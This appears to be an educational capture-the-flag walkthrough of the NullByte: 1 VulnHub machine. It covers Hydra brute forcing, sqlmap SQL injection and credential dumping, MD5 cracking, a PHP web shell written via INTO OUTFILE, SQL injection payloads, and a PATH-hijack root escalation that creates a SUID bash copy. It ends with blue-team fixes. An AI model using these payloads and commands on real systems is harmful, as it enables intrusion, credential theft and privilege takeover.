# NullByte: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an isolated lab network. **Only attack machines you own or are explicitly authorised to test.**

| Field | Value |
| --- | --- |
| **Machine** | NullByte: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | ly0n (@ly0n) |
| **Released** | 1 Aug 2015 |
| **VulnHub Entry** | [https://vulnhub.com/entry/nullbyte-1,126/](https://vulnhub.com/entry/nullbyte-1,126/) |
| **Download** | [https://vulnhub.com/entry/nullbyte-1,126/#download](https://vulnhub.com/entry/nullbyte-1,126/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Debian Linux (32-bit, Debian 8 "Jessie", kernel 3.16 — varies by build) |

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find hidden data inside an image file (metadata / comment) with `exiftool` and `strings`.
- How to attack a login form with **Hydra** and a wordlist.
- How to detect and exploit a **SQL injection** with `sqlmap` (and by hand).
- How to turn SQL injection into a **PHP web shell** using `SELECT ... INTO OUTFILE`.
- How to crack a password (base64 + MD5) and reuse it for SSH.
- How to escalate to root by **PATH hijacking** a SUID-root binary that calls another program by name.

**Prerequisites:** Kali Linux with `exiftool`, `hydra`, `sqlmap` installed. See `docs/LAB-SETUP.md` and `docs/TOOLS.md`.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your Kali box is `192.168.56.10` on `192.168.56.0/24`, so the target shares the `192.168.56.` prefix.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   (Kali)
192.168.56.101  08:00:27:11:22:33   (target)
```

> **Why it works:** `arp-scan` lists every host that answers ARP on the subnet — no open port required.

**Target IP:** `192.168.56.101`

![finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
PORT      STATE    SERVICE
80/tcp    open     http
111/tcp   open     rpcbind
777/tcp   open     ssh
```

```bash
sudo nmap -sC -sV -p80,111,777 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Null Byte 00 - level 1
111/tcp open  rpcbind 2-4 (RPC #100000)
777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
```

> **How to read it:**
> - **80/http** — Apache hosting the challenge site ("Null Byte 00 - level 1").
> - **111/rpcbind** — RPC portmapper; usually not directly exploitable here.
> - **777/ssh** — SSH is running on a **non-standard port** (777 instead of 22). Remember this for later.
> - Standard port **22 is filtered** on this box — that's why we scan all ports (`-p-`).

![nmap service scan output](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Hidden directory in the image

Open `http://192.168.56.101/` in a browser — a "Null Byte" page with a single image and no links. Download the image and inspect its **metadata**:


> ### 📖 Concept — Steganography and file carving
>
> CTF authors hide data in files constantly. Know the layers, cheapest first:
>
> | Layer | Tool | What it finds |
> | --- | --- | --- |
> | **Metadata** | `exiftool img.jpg` | Comments, GPS, software version, **author**, dates |
> | **Trailing data** | `binwalk img.jpg`, `strings`, `xxd` | A ZIP or text appended *after* the image's end-of-file marker |
> | **Embedded files** | `binwalk -e`, `foremost`, `scalpel` | Carves out files hidden inside another |
> | **LSB steganography** | `zsteg`, `stegsolve` | Payload in the least-significant bits of pixel data |
> | **Password-protected** | `steghide extract -sf img.jpg` | Data hidden with a passphrase (try the box's other creds) |
>
> ```bash
> exiftool image.jpg
> binwalk image.jpg
> strings -n 6 image.jpg | head -50
> zsteg -a image.png
> steghide extract -sf image.jpg
> ```
>
> **Start with `exiftool` and `binwalk`.** They are instant and they account for most
> CTF "steganography" — which is usually just *a file appended to another file* or *a
> comment in the metadata*, not real LSB embedding. `binwalk` reporting a `Zip archive
> data` at a non-zero offset means exactly that: two files concatenated.
>
> If a ZIP is recovered and password-protected: `zip2john file.zip > zip.hash` then
> `john --wordlist=rockyou.txt zip.hash`, or `fcrackzip -D -u -p dict.txt file.zip`.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
wget http://192.168.56.101/main.gif
exiftool main.gif
```

```text
File Name : main.gif
File Type : GIF
...
Comment   : P-): kzMb5nVYJw
```

> **How to read it:** the GIF's **Comment** field hides the string `kzMb5nVYJw`. (You can also run `strings main.gif | grep -i kzMb`.) This looks like a URL path — try it.

![key enumeration finding](images/03-enum.png)

### 3.2 The "key" form

Browse to the hidden path:

```text
http://192.168.56.101/kzMb5nVYJw/
```

You get a small form asking for a **key**. View the page source — a comment says the *password isn't complex*. Brute force it with Hydra:


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
hydra -l ignore -P /usr/share/wordlists/rockyou.txt \
  192.168.56.101 http-post-form \
  "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -V
```

```text
[80][http-post-form] host: 192.168.56.101   password: elite
```

> **How to read it:** `http-post-form` tells Hydra it's a login form; the string after the last `:` (`invalid key`) is the **failure** text it should NOT see on a correct guess. The key is `elite`.

Entering `elite` reveals a second page: `420search.php`, a form that searches users.

### 3.3 SQL injection → credentials

Submit a `"` (double quote) as the search term and you get a MySQL error — a classic SQL injection signature. Confirm and dump the database with `sqlmap`:


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```bash
sqlmap -u "http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=admin" --dbs
```

```text
[INFO] the back-end DBMS is MySQL
available databases [5]:
[*] information_schema
[*] mysql
[*] phpmyadmin
[*] performance_schema
[*] seth
```

```bash
sqlmap -u "http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=admin" \
  -D seth -T users -C id,user,pass --dump
```

```text
Database: seth
Table: users
+----+--------+---------------------------------------------+
| id | user   | pass                                        |
+----+--------+---------------------------------------------+
| 1  | ramses | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |
| 2  | isis   | --not allowed--                             |
+----+--------+---------------------------------------------+
```

> **Why it works:** the search box builds an SQL query from raw user input. `usrtosearch=` is concatenated straight into a `SELECT`, so `sqlmap` can read any table. The `pass` for `ramses` is **base64**, not a hash.

Decode the base64 (note the missing padding `=` needed for the length):


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=" | base64 -d; echo
```

```text
c6d6bd7ebf806f43c76acc3681703b81
```

> **How to read it:** decoding base64 gives an **MD5 hash**. Crack it (e.g. [CrackStation](https://crackstation.net/) or `hashcat -m 0`):


> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
echo "c6d6bd7ebf806f43c76acc3681703b81" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
c6d6bd7ebf806f43c76acc3681703b81:omega
```

So the credentials are **`ramses:omega`**.

### 3.4 Log in over SSH (port 777)

```bash
ssh ramses@192.168.56.101 -p 777
```

```text
ramses@192.168.56.101's password: omega
...
ramses@NullByte:~$ id
uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
```

> **Why it works:** password reuse — the DB password also opens the SSH service (on port 777). We now have a proper user shell.

![foothold via SSH as ramses](images/04-foothold.png)

### 3.5 Alternative foothold — SQL injection to a web shell

You can also skip SSH and write a **PHP web shell** straight into the web root with `SELECT ... INTO OUTFILE`. The MySQL user is `root`, and `/var/www/html/uploads/` is world-writable.

```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/uploads/cmd.php'
```

> **Why it works:** MySQL is running as an OS user that can write to `/var/www/html/uploads/`. `INTO OUTFILE` writes a file on the database server — here a PHP script that runs whatever command we pass in `?c=`.

```text
http://192.168.56.101/uploads/cmd.php?c=id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Also available:** MySQL `root`'s password is `sunnyvale`, and `phpMyAdmin` is exposed (often at `/phpmyadmin`) — log in as `root:sunnyvale` and run the same `INTO OUTFILE` query from the SQL tab. (The SSH route is cleaner for beginners.)

> **Note:** NullByte has no `user.txt`; the goal is root's `proof.txt`, so continue to privesc.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Shoulder-surf the admin's history

```bash
cat /home/ramses/.bash_history
```

```text
sudo -s
su eric
cd /var/www
cd backup/
ls
./procwatch
...
```

> **How to read it:** the previous admin ran a program called **`procwatch`** in `/var/www/backup`. That is a strong lead.

### 4.2 Find the SUID binary


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/pt_chown
/var/www/backup/procwatch      <-- unusual
```

> **How to read it:** `procwatch` is a **SUID** binary in a web directory — root-owned and running with root privileges. Let's see what it does.

```bash
ls -la /var/www/backup/procwatch
/var/www/backup/procwatch
```

```text
-rwsr-xr-x 1 root root 4932 ... procwatch
  PID TTY          TIME CMD
 3311 pts/0    00:00:00 procwatch
 3312 pts/0    00:00:00 sh
 3313 pts/0    00:00:00 ps
```

> **Why it matters:** running it shows a `ps`-style listing, meaning `procwatch` **executes the command `ps`** — and it does so **without a full path** (just `ps`, not `/bin/ps`).

### 4.3 What is PATH hijacking?

When a program runs `ps` (no path), the kernel searches the directories listed in your **`$PATH`** environment variable, left to right, and runs the **first** matching file. If we put a malicious file named `ps` in a directory **earlier** in `$PATH`, our file runs instead — **as root**, because `procwatch` is SUID.

```bash
echo $PATH
```

```text
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

### 4.4 Exploit it

Create a fake `ps` that copies `/bin/bash` and gives it the SUID bit, then ensure the current directory is first in `$PATH`:


> ### 📖 Concept — PATH hijacking
>
> When a program runs another program **by name only** (`service`, `tar`, `python`)
> rather than by absolute path, the shell searches each directory in `$PATH` **left to
> right** and executes the first match it finds. If you can place a file earlier in
> that search order, you control what runs.
>
> This matters when the calling program is **root-owned** — a cron job, a SUID binary,
> or a startup script:
>
> ```bash
> mkdir -p /tmp/evil
> printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n' > /tmp/evil/service
> chmod +x /tmp/evil/service
> export PATH=/tmp/evil:$PATH
> # wait for the root job to run, then:
> /tmp/rootbash -p
> ```
>
> **Find the opportunity** by inspecting what the privileged program actually calls:
>
> ```bash
> strace -f -e trace=execve /usr/local/bin/script.sh 2>&1 | grep execve
> strings /usr/local/bin/script.sh | grep -E 'system\(|popen\(|exec'
> ```
>
> An `execve("service", ...)` with **no leading `/`** is the vulnerability. A fully
> qualified `/usr/sbin/service` is not.
>
> **Check cron's own PATH first** — `/etc/crontab` usually sets
> `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`, and
> `sudo`'s `secure_path` overrides yours entirely. If `/tmp` cannot get into that
> list, look instead for a writable directory that is *already* in it —
> `/usr/local/bin` very often is.
>
> **Deep dive:** [CONCEPTS §15.8 — PATH hijacking](../../docs/CONCEPTS.md#158-path-hijacking)

```bash
cd /var/www/backup
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' > ps
chmod +x ps
export PATH=/var/www/backup:$PATH
```

> **Why it works:** running `procwatch` makes it call `ps`; because `/var/www/backup` is now first in `$PATH`, it runs **our** `ps` — as root (SUID). Our script copies the shell and marks it SUID.

Trigger it, then run the SUID shell with `-p` (to keep privileges):

```bash
/var/www/backup/procwatch
ls -la /tmp/rootbash
/tmp/rootbash -p
id
```

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
rootbash-4.3# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
```

> **Why `-p` matters:** `bash` drops root by default; `-p` tells it to preserve the effective uid (`euid=0`).

> **Also viable:** this old kernel is vulnerable to Dirty COW (`CVE-2016-5195`) and PwnKit (`CVE-2021-4034`) local privilege escalation, but **PATH hijacking `procwatch` is the intended path**.

### 4.5 The root flag

```bash
cd /root
cat /root/proof.txt
```

```text
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats.
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive data hidden in image metadata | `main.gif` comment | Reveals the hidden path `/kzMb5nVYJw` |
| 2 | Weak password on a login form | `/kzMb5nVYJw/index.php` (`elite`) | Access to the search page |
| 3 | SQL injection | `/kzMb5nVYJw/420search.php?usrtosearch=` | Dump DB users → `ramses` credentials |
| 4 | Weak hashing / password reuse (base64+MD5) | `seth.users`, SSH port 777 | SSH login as `ramses` |
| 5 | MySQL running with excessive file privileges + writable web dir | `SELECT ... INTO OUTFILE` to `/var/www/html/uploads/` | Remote code execution as `www-data` |
| 6 | SUID-root binary calling another program by name | `/var/www/backup/procwatch` → `ps` | **PATH hijack → root** |
| 7 | Unpatched kernel (bonus) | kernel 3.16 (Dirty COW / PwnKit) | Alternative local root escalation |

---

## 6. Defensive lessons (blue team)

- **Sanitise metadata** before publishing images; strip comments with `exiftool -Comment= -overwrite_original main.gif`.
- **Don't hide "secrets" on the client side.** A hidden URL is not access control.
- **Enforce strong passwords and rate limiting** on every login form; `elite` falls instantly to a wordlist.
- **Use parameterised SQL / prepared statements** (never concatenate user input into queries) to kill SQL injection outright.
- **Restrict the database account.** The DB user should not have `FILE` privilege, should not be `root`, and the web root should not be writable by the DB process.
